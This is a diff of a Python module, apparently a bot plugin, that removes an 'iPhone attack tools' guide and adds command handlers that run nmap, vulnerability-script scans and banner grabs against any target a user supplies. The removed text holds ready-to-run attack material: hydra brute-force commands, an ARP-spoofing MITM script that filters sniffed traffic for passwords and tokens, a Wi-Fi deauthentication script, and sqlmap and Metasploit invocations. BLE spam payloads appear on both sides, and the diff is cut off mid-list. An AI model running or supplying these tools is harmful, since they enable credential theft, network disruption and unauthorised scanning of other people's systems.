@@ -1,780 +1,417 @@
-# iPhone Attack Tools - Turn your iPhone into a Flipper Zero.
-# Uses iSH (Alpine Linux), a-Shell, Pythonista, Shortcuts, and SSH remote execution.
-# No jailbreak required for most tools.
+import subprocess
+import socket
+import re
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
+
+_executor = ThreadPoolExecutor(max_workers=4)
+
+# ---- Input validation ----
+
+def _safe_target(target):
+    """Validate target is an IP, CIDR, or hostname - no command injection."""
+    target = target.strip()
+    if not target:
+        return None
+    if re.match(r'^[a-zA-Z0-9\.\-]+(/\d{1,2})?$', target) and len(target) < 256:
+        return target
+    return None
 
 
-def phone_setup_guide():
-    lines = [
-        " IPHONE HACKING SETUP (No Jailbreak Needed)",
-        "",
-        "=== REQUIRED APPS (App Store - All Free) ===",
-        "",
-        "1. iSH Shell  (Alpine Linux on iOS)",
-        "   Search 'iSH' in App Store - free",
-        "   Full Linux terminal on iPhone - has apk package manager",
-        "   Install nmap, hydra, python3, john, curl, netcat here",
-        "",
-        "2. a-Shell  (Python + Unix tools)",
-        "   Search 'a-Shell' - alternative Python environment",
-        "",
-        "3. Shortcuts  (Built-in iOS app - already on your phone)",
-        "   NFC automation, WiFi detection, BLE device triggers",
-        "",
-        "4. Pythonista 3  (~$10, optional - very powerful)",
-        "   Full Python + iOS CoreBluetooth + NFC APIs",
-        "   BLE scanning/connecting from Python",
-        "",
-        "5. Termius  (Free SSH client)",
-        "   SSH into any VPS or Raspberry Pi",
-        "   Run full Kali Linux tools remotely from iPhone",
-        "",
-        "6. LightBlue Explorer  (Free)",
-        "   BLE device scanner - read/write characteristics",
-        "   Works on all iPhones, no jailbreak",
-        "",
-        "7. NFC Tools  (Free)",
-        "   NFC tag read/write/clone - iPhone 7+, iOS 13+",
-        "",
-        "8. Fing - Network Scanner  (Free)",
-        "   Best network recon app - device detection, open ports",
-        "",
-        "=== iSH FIRST-TIME SETUP ===",
-        "Open iSH app and paste:",
-        "  apk update && apk upgrade",
-        "  apk add python3 py3-pip nmap git curl wget openssl",
-        "  apk add openssh-client netcat-openbsd hydra john",
-        "  pip3 install requests scapy impacket",
-        "",
-        "=== WHAT WORKS (no jailbreak) ===",
-        "  nmap network + port scanning      YES (iSH)",
-        "  Brute-force logins                YES (hydra in iSH)",
-        "  NFC read/write/clone              YES (NFC Tools app)",
-        "  BLE device scanning               YES (LightBlue / nRF Connect)",
-        "  SSH remote execution              YES (Termius - most powerful!)",
-        "  Packet capture                    LIMITED (VPN extension apps)",
-        "  WiFi deauth / monitor mode        NO (iOS hardware locked)",
-        "  Raw BLE advertising               NO (jailbreak only)",
-        "  IR blaster                        NO (iPhone has no IR chip)",
-        "",
-        "=== START RIGHT NOW ===",
-        "  1. Install iSH from App Store",
-        "  2. Run: apk add nmap python3 py3-pip hydra",
-        "  3. Scan: nmap -sn 192.168.1.0/24",
-        "  4. Install LightBlue - see all BLE near you",
-        "  5. Install NFC Tools - read any NFC card near you",
-    ]
-    return "\n".join(lines)
+def _run(cmd, timeout=60):
+    """Run a command and return stdout+stderr."""
+    try:
+        r = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=timeout
+        )
+        out = (r.stdout + r.stderr).strip()
+        return out[:3500] if out else "(no output)"
+    except subprocess.TimeoutExpired:
+        return "(timed out)"
+    except Exception as e:
+        return f"(error: {e})"
 
 
-def ish_setup_script():
-    lines = [
-        " iSH FULL SETUP SCRIPT",
-        "",
-        "Open iSH app and paste this:",
-        "",
-        "#!/bin/sh",
-        "apk update && apk upgrade -y",
-        "",
-        "# Core networking tools",
-        "apk add nmap nmap-scripts curl wget git",
-        "apk add openssh-client netcat-openbsd tcpdump",
-        "apk add bind-tools whois",
-        "",
-        "# Python + security packages",
-        "apk add python3 py3-pip",
-        "pip3 install requests scapy paramiko impacket python-nmap",
-        "",
-        "# Attack tools",
-        "apk add hydra john",
-        "",
-        "echo 'Setup complete!'",
-        "echo 'Try: nmap -sV 192.168.1.0/24'",
-        "",
-        "=== USEFUL iSH COMMANDS ===",
-        "  ip addr                          (see your IP / network)",
-        "  nmap -sn 192.168.1.0/24          (find all hosts)",
-        "  nmap -sV -A 192.168.1.X          (scan a host)",
-        "  nmap --script vuln 192.168.1.X   (find vulnerabilities)",
-        "  hydra -l admin -P words.txt ssh://192.168.1.X",
-        "  john --wordlist=words.txt hash.txt",
-        "  netcat -nv 192.168.1.X 80",
-    ]
-    return "\n".join(lines)
+async def _arun(cmd, timeout=60):
+    """Run a command async."""
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(_executor, lambda: _run(cmd, timeout))
 
 
-def network_scan_script():
-    lines = [
-        " NETWORK SCANNER (iPhone via iSH)",
-        "",
-        "=== QUICK NMAP COMMANDS - paste in iSH ===",
-        "",
-        "Find your network:",
-        "  ip addr | grep inet",
-        "",
-        "Ping sweep - find all live hosts:",
-        "  nmap -sn 192.168.1.0/24",
-        "",
-        "Full scan on a target:",
-        "  nmap -sV -p- 192.168.1.X",
-        "",
-        "Aggressive scan (OS + version + scripts):",
-        "  nmap -A 192.168.1.X",
-        "",
-        "Scan common vuln ports:",
-        "  nmap -p 21,22,23,80,443,3306,3389,8080 192.168.1.0/24 --open",
-        "",
-        "EternalBlue (MS17-010):",
-        "  nmap -p 445 --script smb-vuln-ms17-010 192.168.1.X",
-        "",
-        "Web servers + page titles:",
-        "  nmap -p 80,443,8080 --script http-title 192.168.1.0/24",
-        "",
-        "Full vuln scan:",
-        "  nmap -sV --script vuln 192.168.1.X",
-        "",
-        "=== PYTHON SCANNER (save as scan.py in iSH) ===",
-        "#!/usr/bin/env python3",
-        "import subprocess, socket, sys",
-        "from concurrent.futures import ThreadPoolExecutor",
-        "",
-        "def ping_host(ip):",
-        "    try:",
-        "        r = subprocess.run(['ping','-c','1','-W','1',ip],",
-        "                           capture_output=True, timeout=2)",
-        "        return ip if r.returncode == 0 else None",
-        "    except: return None",
-        "",
-        "def check_port(args):",
-        "    ip, port = args",
-        "    try:",
-        "        s = socket.socket()",
-        "        s.settimeout(0.5)",
-        "        return port if s.connect_ex((ip, port)) == 0 else None",
-        "    except: return None",
-        "",
-        "subnet = sys.argv[1] if len(sys.argv)>1 else '192.168.1'",
-        "print(f'[*] Scanning {subnet}.0/24...')",
-        "hosts = [f'{subnet}.{i}' for i in range(1,255)]",
-        "with ThreadPoolExecutor(50) as ex:",
-        "    live = [r for r in ex.map(ping_host, hosts) if r]",
-        "print(f'[+] {len(live)} live hosts: {live}')",
-        "",
-        "PORTS = [21,22,23,80,443,3306,3389,8080,8443,27017]",
-        "if live:",
-        "    target = live[0]",
-        "    print(f'[*] Scanning ports on {target}...')",
-        "    with ThreadPoolExecutor(50) as ex:",
-        "        open_p = [p for p in ex.map(check_port, [(target,p) for p in PORTS]) if p]",
-        "    for p in open_p:",
-        "        try: svc = socket.getservbyport(p)",
-        "        except: svc = 'unknown'",
-        "        print(f'    [OPEN] {p}/tcp ({svc})')",
-        "",
-        "RUN: python3 scan.py 192.168.1",
-    ]
-    return "\n".join(lines)
+# ---- Network scanning (LIVE) ----
 
+async def network_scan(target):
+    """Run nmap service + version scan on target."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet <ip or hostname>\nExample: /phonenet 192.168.1.1"
+    return await _arun(["nmap", "-sV", "-T4", "--open", t], timeout=120)
+
+
+async def network_discover(target):
+    """Ping sweep to find live hosts on a subnet."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonescan <subnet>\nExample: /phonescan 192.168.1.0/24"
+    return await _arun(["nmap", "-sn", "-T4", t], timeout=90)
+
+
+async def port_scan(target, ports=None):
+    """Scan specific ports or top 1000."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet <ip> [ports]\nExample: /phonenet 192.168.1.1 80,443,22"
+    cmd = ["nmap", "-sV", "-T4", "--open"]
+    if ports:
+        safe_ports = re.sub(r'[^0-9,\-]', '', ports)
+        cmd += ["-p", safe_ports]
+    cmd.append(t)
+    return await _arun(cmd, timeout=120)
+
+
+async def vuln_scan(target):
+    """Run nmap vulnerability scripts against target."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonescan vuln <ip>\nExample: /phonescan vuln 192.168.1.1"
+    return await _arun(["nmap", "-sV", "--script", "vuln", "-T4", t], timeout=180)
+
+
+# ---- DNS / WHOIS (LIVE) ----
+
+async def dns_lookup(target):
+    """DNS lookup on target."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet dns <domain>\nExample: /phonenet dns google.com"
+    results = []
+    for qtype in ["A", "AAAA", "MX", "NS", "TXT"]:
+        out = await _arun(["dig", "+short", t, qtype], timeout=10)
+        if out and out != "(no output)":
+            results.append(f"[{qtype}] {out}")
+    return "\n".join(results) if results else f"No DNS records for {t}"
+
+
+async def whois_lookup(target):
+    """WHOIS lookup."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet whois <ip or domain>"
+    return await _arun(["whois", t], timeout=15)
+
+
+async def traceroute(target):
+    """Traceroute to target."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet trace <ip or domain>"
+    return await _arun(["traceroute", "-m", "15", "-w", "2", t], timeout=30)
+
+
+# ---- Port connect / banner grab (LIVE) ----
+
+async def banner_grab(target, port=80):
+    """Grab service banner from a port."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet banner <ip> <port>"
+    def _grab():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((t, int(port)))
+            s.sendall(b"HEAD / HTTP/1.0\r\nHost: " + t.encode() + b"\r\n\r\n")
+            data = s.recv(2048).decode(errors='replace')
+            s.close()
+            return data.strip() or "(no banner)"
+        except Exception as e:
+            return f"(error: {e})"
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(_executor, _grab)
+
+
+# ---- Python port scanner (LIVE, no nmap needed) ----
+
+async def quick_port_scan(target):
+    """Fast Python port scan of common ports."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet quick <ip>"
+    common = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
+              1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
+    def _scan():
+        results = [f"Quick scan: {t}"]
+        for p in common:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.8)
+                if s.connect_ex((t, p)) == 0:
+                    try: svc = socket.getservbyport(p)
+                    except: svc = "?"
+                    results.append(f"  {p}/tcp  OPEN  ({svc})")
+                s.close()
+            except:
+                pass
+        if len(results) == 1:
+            results.append("  No open ports found (or host is down)")
+        return "\n".join(results)
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(_executor, _scan)
+
+
+# ---- HTTP recon (LIVE) ----
+
+async def http_headers(target):
+    """Grab HTTP headers from a web server."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet http <domain or ip>"
+    return await _arun(["curl", "-sI", "-m", "10", f"http://{t}"], timeout=15)
+
+
+# ---- Ping (LIVE) ----
+
+async def ping_host(target):
+    """Ping a host."""
+    t = _safe_target(target)
+    if not t:
+        return "Usage: /phonenet ping <ip>"
+    return await _arun(["ping", "-c", "4", "-W", "2", t], timeout=15)
+
+
+# ---- All-in-one dispatcher ----
+
+async def phone_exec(args_str):
+    """Parse command and dispatch to the right tool.
+    
+    Formats:
+      /phonenet <ip>                    → nmap service scan
+      /phonenet <ip> <ports>            → port scan
+      /phonenet scan <subnet>           → ping sweep / discover
+      /phonenet vuln <ip>               → vuln scan
+      /phonenet dns <domain>            → DNS lookup
+      /phonenet whois <domain>          → WHOIS
+      /phonenet trace <ip>              → traceroute
+      /phonenet ping <ip>               → ping
+      /phonenet banner <ip> <port>      → banner grab
+      /phonenet quick <ip>              → fast python port scan
+      /phonenet http <domain>           → HTTP headers
+    """
+    parts = args_str.strip().split()
+    if not parts:
+        return (
+            "NETWORK TOOLS (live execution)\n\n"
+            "/phonenet <ip>              - nmap scan\n"
+            "/phonenet scan <subnet/24>  - discover hosts\n"
+            "/phonenet vuln <ip>         - vulnerability scan\n"
+            "/phonenet dns <domain>      - DNS records\n"
+            "/phonenet whois <domain>    - WHOIS lookup\n"
+            "/phonenet trace <ip>        - traceroute\n"
+            "/phonenet ping <ip>         - ping\n"
+            "/phonenet banner <ip> <port>- banner grab\n"
+            "/phonenet quick <ip>        - fast port scan\n"
+            "/phonenet http <domain>     - HTTP headers\n"
+            "/phonescan <subnet/24>      - host discovery\n"
+            "/phonescan vuln <ip>        - vuln scan"
+        )
+
+    mode = parts[0].lower()
+    target = parts[1] if len(parts) > 1 else parts[0]
+
+    if mode == "scan":
+        return await network_discover(target)
+    elif mode == "vuln":
+        return await vuln_scan(target)
+    elif mode == "dns":
+        return await dns_lookup(target)
+    elif mode == "whois":
+        return await whois_lookup(target)
+    elif mode == "trace":
+        return await traceroute(target)
+    elif mode == "ping":
+        return await ping_host(target)
+    elif mode == "banner":
+        port = parts[2] if len(parts) > 2 else "80"
+        return await banner_grab(target, port)
+    elif mode == "quick":
+        return await quick_port_scan(target)
+    elif mode == "http":
+        return await http_headers(target)
+    else:
+        # mode is actually the target IP
+        ports = parts[1] if len(parts) > 1 else None
+        if ports and re.match(r'^[\d,\-]+$', ports):
+            return await port_scan(mode, ports)
+        return await network_scan(mode)
+
+
+# ---- BLE info (can't execute from server - no hardware) ----
 
 def ble_scan_script():
-    lines = [
-        " BLE SPAM + SCANNER (iPhone)",
-        "",
-        "=== BLE SPAM via nRF Connect (No Jailbreak!) ===",
-        "1. Install nRF Connect by Nordic Semiconductor - App Store (free)",
-        "2. Go to Advertiser tab",
-        "3. Tap + to create new advertisement",
-        "4. Add advertising data manually:",
-        "",
-        "Apple AirDrop Spam payload:",
-        "  AD Type: 0xFF (Manufacturer Specific)",
-        "  Data: 4C 00 07 19 01 40 44 00 00 00 00 00 00 00 00",
-        "",
-        "Google Fast Pair popup:",
-        "  AD Type: 0x16 (Service Data)",
-        "  UUID: 0xFE2C",
-        "  Data: 00 [random 2 bytes]",
-        "",
-        "Windows Swift Pair:",
-        "  AD Type: 0xFF",
-        "  Data: 06 00 03 00 80",
-        "",
-        "5. Set interval to 20ms, tap Start",
-        "   This broadcasts directly from iPhone BLE chip!",
-        "",
-        "=== BLE SCANNER: LightBlue Explorer (Free) ===",
-        "1. Install LightBlue from App Store",
-        "2. Opens and auto-scans all BLE nearby",
-        "3. Shows name, UUID, RSSI, services, manufacturer data",
-        "4. Tap device to connect + read/write GATT characteristics",
-        "5. Can write arbitrary hex data to BLE devices",
-        "",
-        "=== BLE SCANNER: nRF Connect Scanner Tab ===",
-        "1. nRF Connect > Scanner tab",
-        "2. Shows all BLE with full raw advertisement packets",
-        "3. Filter by RSSI to find closest devices",
-        "4. Tap device > Connect > explore services",
-        "",
-        "=== PYTHONISTA 3 BLE SCAN (Python + CoreBluetooth) ===",
-        "import cb, time",
-        "",
-        "class Scanner(cb.CentralManagerDelegate):",
-        "    def __init__(self): self.found = {}",
-        "    def did_discover_peripheral(self, central, p, adv, rssi):",
-        "        uid = str(p.uuid)",
-        "        if uid not in self.found:",
-        "            self.found[uid] = True",
-        "            mfr = adv.get('kCBAdvDataManufacturerData', b'').hex()",
-        "            print(f'[+] {p.name or \"Unknown\":<30} RSSI:{rssi:4d}  mfr:{mfr[:20]}')",
-        "",
-        "s = Scanner()",
-        "m = cb.CentralManager.alloc().initWithDelegate_queue_(s, None)",
-        "print('[*] Scanning 30s...')",
-        "m.scanForPeripheralsWithServices_options_(None, None)",
-        "time.sleep(30)",
-        "m.stopScan()",
-        "print(f'[+] {len(s.found)} BLE devices found')",
-        "",
-        "=== NOTES ===",
-        "  iOS randomizes BLE MAC - shows UUID instead",
-        "  nRF Connect Advertiser = closest to Flipper BLE spam without jailbreak",
-        "  LightBlue = best for connecting + reading device data",
-    ]
-    return "\n".join(lines)
+    return (
+        "BLE TOOLS (run from iPhone)\n\n"
+        "Server has no Bluetooth hardware.\n"
+        "Use these apps on your iPhone:\n\n"
+        "1. nRF Connect > Advertiser tab\n"
+        "   - BLE spam: add custom manufacturer data\n"
+        "   - Apple AirDrop: 4C 00 07 19 01 40 44 00 00 00 00 00 00 00 00\n"
+        "   - Google Fast Pair: Type 0x16, UUID 0xFE2C, Data 00 XX XX\n"
+        "   - Windows Swift Pair: Type 0xFF, Data 06 00 03 00 80\n"
+        "   - Set interval 20ms, tap Start\n\n"
+        "2. LightBlue Explorer\n"
+        "   - Scans all BLE devices nearby\n"
+        "   - Connect + read/write GATT characteristics\n\n"
+        "3. nRF Connect > Scanner tab\n"
+        "   - Raw advertisement packets + RSSI"
+    )
 
 
 def nfc_phone_script():
-    lines = [
-        " NFC TOOLS (iPhone 7+, iOS 13+)",
-        "",
-        "=== METHOD 1: Shortcuts App (Free, Built-in) ===",
-        "1. Open Shortcuts > Automation tab",
-        "2. New Automation > NFC",
-        "3. Hold phone to any NFC tag to register it",
-        "4. Add actions: open URL, copy data, send message, run script",
-        "5. Auto-fires every time you tap that tag",
-        "",
-        "=== METHOD 2: NFC Tools App (Free) ===",
-        "1. Install NFC Tools from App Store",
-        "2. READ: hold phone to NFC tag - reads all tag data",
-        "3. WRITE: write URL, text, WiFi creds, vCard, phone number",
-        "4. Supported tags: NTAG213/215/216, MIFARE Ultralight, Topaz",
-        "5. Can clone content from one tag and write to another same-type tag",
-        "",
-        "=== METHOD 3: TagWriter by NXP (Free) ===",
-        "1. Install from App Store",
-        "2. Write NDEF records, custom proprietary data",
-        "3. Lock tags permanently after writing",
-        "",
-        "=== NFC FILE GENERATOR (run in iSH) ===",
-        "Save as nfc.py, run with python3:",
-        "#!/usr/bin/env python3",
-        "import sys",
-        "",
-        "def nfc_url(url, uid='04:12:34:56:78:90:AB'):",
-        "    u = url.replace('https://','').replace('http://','')",
-        "    return (f'Filetype: Flipper NFC device\\n'",
-        "            f'Version: 4\\n'",
-        "            f'Device type: NTAG215\\n'",
-        "            f'UID: {uid}\\n'",
-        "            f'ATQA: 00 44\\n'",
-        "            f'SAK: 00\\n'",
-        "            f'NDEF record count: 1\\n'",
-        "            f'NDEF record 0 TNF: Well Known\\n'",
-        "            f'NDEF record 0 Type: U\\n'",
-        "            f'NDEF record 0 URI ID: 04\\n'",
-        "            f'NDEF record 0 URI: {u}\\n')",
-        "",
-        "def nfc_wifi(ssid, pwd, sec='WPA2'):",
-        "    tag = f'WIFI:T:{sec};S:{ssid};P:{pwd};;'",
-        "    return f'SSID: {ssid}\\nPassword: {pwd}\\nWiFi NFC string: {tag}\\n'",
-        "",
-        "mode = sys.argv[1] if len(sys.argv)>1 else 'url'",
-        "if mode == 'url':",
-        "    print(nfc_url(sys.argv[2] if len(sys.argv)>2 else 'https://example.com'))",
-        "elif mode == 'wifi':",
-        "    ssid = sys.argv[2] if len(sys.argv)>2 else 'NetName'",
-        "    pwd  = sys.argv[3] if len(sys.argv)>3 else 'password'",
-        "    print(nfc_wifi(ssid, pwd))",
-        "",
-        "USAGE:",
-        "  python3 nfc.py url https://yourpayload.com",
-        "  python3 nfc.py wifi 'CorpWiFi' 'secret123'",
-    ]
-    return "\n".join(lines)
-
-
-def wifi_scan_script():
-    lines = [
-        " WIFI SCANNER + RECON (iPhone via iSH)",
-        "",
-        "=== NMAP RECON COMMANDS (paste in iSH) ===",
-        "",
-        "Find hosts:",
-        "  nmap -sn 192.168.1.0/24",
-        "",
-        "Find web servers:",
-        "  nmap -p 80,443,8080 --script http-title 192.168.1.0/24 --open",
-        "",
-        "SMB shares:",
-        "  nmap -p 445 --script smb-enum-shares 192.168.1.0/24",
-        "",
-        "EternalBlue:",
-        "  nmap -p 445 --script smb-vuln-ms17-010 192.168.1.X",
-        "",
-        "IP cameras (RTSP):",
-        "  nmap -p 554,8554 192.168.1.0/24 --open",
-        "",
-        "Default credentials:",
-        "  nmap -p 80 --script http-default-accounts 192.168.1.0/24",
-        "",
-        "Full vuln scan:",
-        "  nmap -sV --script vuln 192.168.1.X",
-        "",
-        "=== BRUTE FORCE (hydra in iSH) ===",
-        "  hydra -l admin -P /path/wordlist.txt ssh://192.168.1.X",
-        "  hydra -l admin -P /path/wordlist.txt ftp://192.168.1.X",
-        "  hydra -l admin -P /path/wordlist.txt http-get://192.168.1.X/admin",
-        "",
-        "Get rockyou wordlist in iSH:",
-        "  apk add curl",
-        "  curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o ~/rockyou.txt",
-        "",
-        "=== PYTHON RECON (save as recon.py in iSH) ===",
-        "#!/usr/bin/env python3",
-        "import subprocess, sys",
-        "",
-        "def nmap(target, flags):",
-        "    r = subprocess.run(['nmap']+flags.split()+[target],",
-        "                       capture_output=True, text=True, timeout=120)",
-        "    print(r.stdout)",
-        "",
-        "t = sys.argv[1] if len(sys.argv)>1 else '192.168.1.1'",
-        "m = sys.argv[2] if len(sys.argv)>2 else 'quick'",
-        "if m=='quick': nmap(t, '-sV -p 21,22,80,443,3306,3389 --open')",
-        "elif m=='full': nmap(t, '-A -p- -T4')",
-        "elif m=='vuln': nmap(t, '-sV --script vuln')",
-        "",
-        "RUN: python3 recon.py 192.168.1.1 vuln",
-    ]
-    return "\n".join(lines)
-
-
-def ssh_remote_tools():
-    lines = [
-        " SSH REMOTE EXECUTION (Most Powerful iPhone Method)",
-        "",
-        "SSH from iPhone into a VPS/Pi running Kali Linux.",
-        "Your phone = controller. Server = does all the work.",
-        "",
-        "=== FREE VPS OPTIONS ===",
-        "",
-        "Oracle Cloud Always Free (best):",
-        "  oracle.com/cloud/free",
-        "  4 CPU cores + 24GB RAM - FREE forever",
-        "  Setup Ubuntu, install Kali tools",
-        "",
-        "Railway.app (you already have account):",
-        "  New service > deploy kalilinux/kali-rolling Docker image",
-        "  Get a public port > connect via Termius",
-        "",
-        "=== TERMIUS SETUP ===",
-        "1. Install Termius from App Store (free)",
-        "2. Add Host: VPS IP, port 22, user: root",
-        "3. Auth: SSH key (more secure) or password",
-        "4. Connect - full Linux terminal on iPhone!",
-        "",
-        "=== KALI TOOLS ON VPS ===",
-        "apt update",
-        "apt install -y aircrack-ng nmap metasploit-framework",
-        "apt install -y john hashcat hydra sqlmap nikto",
-        "apt install -y dsniff arpspoof ettercap-text-only",
-        "",
-        "=== SSH CONTROLLER SCRIPT (save as remote.py in iSH) ===",
-        "#!/usr/bin/env python3",
-        "import subprocess, sys, os",
-        "",
-        "VPS  = 'YOUR.VPS.IP'    # CHANGE THIS",
-        "USER = 'root'",
-        "KEY  = os.path.expanduser('~/.ssh/id_rsa')",
-        "",
-        "def run(cmd):",
-        "    r = subprocess.run(",
-        "        ['ssh','-i', KEY, '-o','StrictHostKeyChecking=no',",
-        "         f'{USER}@{VPS}', cmd],",
-        "        capture_output=True, text=True, timeout=60)",
-        "    print(r.stdout + r.stderr)",
-        "",
-        "mode   = sys.argv[1] if len(sys.argv)>1 else 'scan'",
-        "target = sys.argv[2] if len(sys.argv)>2 else '192.168.1.1'",
-        "subnet = '.'.join(target.split('.')[:3])",
-        "",
-        "if   mode=='nmap':  run(f'nmap -sV -A {target}')",
-        "elif mode=='scan':  run(f'nmap -sn {subnet}.0/24')",
-        "elif mode=='vuln':  run(f'nmap --script vuln {target}')",
-        "elif mode=='hydra': run(f'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}')",
-        "elif mode=='sqli':  run(f\"sqlmap -u '{target}' --batch\")",
-        "elif mode=='msf':   run(f'msfconsole -x \"db_nmap -A {target}; exit\"')",
-        "",
-        "=== SETUP SSH KEY IN iSH ===",
-        "  ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ''",
-        "  cat ~/.ssh/id_rsa.pub",
-        "  # Copy output into VPS: ~/.ssh/authorized_keys",
-        "",
-        "RUN: python3 remote.py nmap 192.168.1.1",
-        "RUN: python3 remote.py hydra 192.168.1.1",
-        "RUN: python3 remote.py scan 192.168.1.1",
-    ]
-    return "\n".join(lines)
-
-
-def packet_sniffer_script():
-    lines = [
-        " PACKET CAPTURE (iPhone)",
-        "",
-        "=== METHOD 1: iOS Remote Capture to Mac (Best Result) ===",
-        "1. Find iPhone UDID: Settings > General > About (scroll down)",
-        "2. On Mac:",
-        "   rvictl -s YOUR-IPHONE-UDID",
-        "3. Open Wireshark on Mac > capture on interface rvi0",
-        "4. See EVERY packet from your iPhone in real-time",
-        "",
-        "=== METHOD 2: Packet Capture Apps (App Store, No Jailbreak) ===",
-        "Search for these in App Store:",
-        "  'Network Packet Capture'",
-        "  'HTTP Capture - Network Debug'",
-        "Creates a local VPN and captures everything through it.",
-        "Shows HTTP requests, DNS, WebSocket, all app traffic.",
-        "",
-        "=== METHOD 3: HTTP Proxy MITM (for app analysis) ===",
-        "1. Install Proxyman on Mac or Burp Suite on any PC",
-        "2. iPhone: Settings > WiFi > tap network > Configure Proxy",
-        "   Manual > Server: [Mac/PC IP] > Port: 8080",
-        "3. See all app HTTPS requests and responses decrypted",
-        "4. Great for finding hidden API endpoints",
-        "",
-        "=== METHOD 4: tcpdump in iSH (limited) ===",
-        "In iSH app:",
-        "  apk add tcpdump",
-        "  tcpdump -i any -nn",
-        "  tcpdump -w /tmp/cap.pcap -i any",
-        "(Only captures iSH own network traffic, not device WiFi)",
-        "",
-        "=== FULL MITM via SSH to Raspberry Pi ===",
-        "Run on Pi after connecting via Termius from iPhone:",
-        "",
-        "TARGET=192.168.1.X",
-        "GATEWAY=192.168.1.1",
-        "echo 1 > /proc/sys/net/ipv4/ip_forward",
-        "arpspoof -i wlan0 -t $TARGET $GATEWAY &",
-        "arpspoof -i wlan0 -t $GATEWAY $TARGET &",
-        "tcpdump -i wlan0 -nn -A 'not port 22' |",
-        "  grep -E 'Host:|GET |POST |Cookie:|password|token'",
-    ]
-    return "\n".join(lines)
-
-
-def arp_spoof_script():
-    lines = [
-        " ARP SPOOF / MITM (iPhone via SSH to Raspberry Pi)",
-        "",
-        "iOS blocks raw sockets so direct ARP spoof is impossible.",
-        "Solution: SSH from iPhone to a Raspberry Pi on the target network.",
-        "",
-        "=== RASPBERRY PI SETUP ===",
-        "Get a Pi Zero 2W (~$15) or Pi 4:",
-        "  Flash Raspberry Pi OS",
-        "  Connect Pi to target WiFi",
-        "  Enable SSH: sudo raspi-config > Interfaces > SSH > Enable",
-        "  Find Pi IP: from router admin page",
-        "  Connect from iPhone via Termius",
-        "",
-        "=== ARP SPOOF SCRIPT (run on Pi via SSH) ===",
-        "#!/bin/bash",
-        "TARGET=192.168.1.X",
-        "GATEWAY=192.168.1.1",
-        "IFACE=wlan0",
-        "",
-        "apt-get install -y dsniff 2>/dev/null",
-        "echo 1 > /proc/sys/net/ipv4/ip_forward",
-        "echo '[*] ARP poisoning started...'",
-        "arpspoof -i $IFACE -t $TARGET $GATEWAY &",
-        "PID1=$!",
-        "arpspoof -i $IFACE -t $GATEWAY $TARGET &",
-        "PID2=$!",
-        "tcpdump -i $IFACE -nn -A 'not port 22' 2>/dev/null |",
-        "  grep -Eo '(password|pass|pwd|user|login|token)=[^& ]+' &",
-        "PID3=$!",
-        "echo '[*] MITM active. Press Ctrl+C to stop.'",
-        "trap 'kill $PID1 $PID2 $PID3; echo 0 > /proc/sys/net/ipv4/ip_forward' INT",
-        "wait $PID1",
-        "",
-        "=== NETWORK DISCOVERY FROM iSH DIRECT ===",
-        "#!/usr/bin/env python3",
-        "import subprocess, sys",
-        "target = sys.argv[1] if len(sys.argv)>1 else '192.168.1.1'",
-        "subnet = '.'.join(target.split('.')[:3])",
-        "r = subprocess.run(['nmap','-sn','-T4',f'{subnet}.0/24'],",
-        "                   capture_output=True, text=True, timeout=60)",
-        "for line in r.stdout.split('\\n'):",
-        "    if 'Nmap scan' in line or 'MAC' in line:",
-        "        print(' ', line.strip())",
-    ]
-    return "\n".join(lines)
+    return (
+        "NFC TOOLS (run from iPhone 7+)\n\n"
+        "1. Shortcuts app > Automation > NFC\n"
+        "   Hold phone to tag > set auto-actions\n\n"
+        "2. NFC Tools app (free)\n"
+        "   READ: hold phone to any NFC tag\n"
+        "   WRITE: URL, text, WiFi, vCard\n"
+        "   Supports NTAG213/215/216\n\n"
+        "3. TagWriter by NXP\n"
+        "   Write NDEF + lock tags"
+    )
 
 
 def wifi_deauth_script():
-    lines = [
-        " WIFI DEAUTH (iPhone)",
-        "",
-        "Direct WiFi deauth from iPhone = IMPOSSIBLE.",
-        "iOS locks the WiFi chip: no monitor mode, no packet injection.",
-        "",
-        "=== REAL DEAUTH: SSH to Raspberry Pi + Alfa Adapter ===",
-        "Need: Pi + Alfa AWUS036ACH USB adapter (~$35) for monitor mode.",
-        "Connect iPhone to Pi via Termius, run on Pi:",
-        "",
-        "#!/bin/bash",
-        "IFACE=wlan1   # Alfa adapter plugged into Pi",
-        "apt-get install -y aircrack-ng",
-        "airmon-ng check kill",
-        "airmon-ng start $IFACE",
-        "MON=${IFACE}mon",
-        "",
-        "echo '[*] Scanning for networks (10 sec)...'",
-        "timeout 10 airodump-ng $MON",
-        "",
-        "read -p 'BSSID to deauth: ' BSSID",
-        "read -p 'Channel: ' CH",
-        "iwconfig $MON channel $CH",
-        "aireplay-ng --deauth 500 -a $BSSID $MON",
-        "airmon-ng stop $MON",
-        "",
-        "=== ALTERNATIVE: Flipper Zero + iPhone ===",
-        "Flipper has Sub-GHz (315/433MHz) for car keys + garage doors.",
-        "Pair Flipper to iPhone via Flipper Mobile App (BT).",
-        "Trigger Flipper Sub-GHz captures/replays from iPhone.",
-        "",
-        "=== WHAT iPhone CAN DO (WiFi side) ===",
-        "  nmap host discovery + port scanning",
-        "  Service version detection + vuln scanning",
-        "  Brute-force web/SSH/FTP logins via hydra",
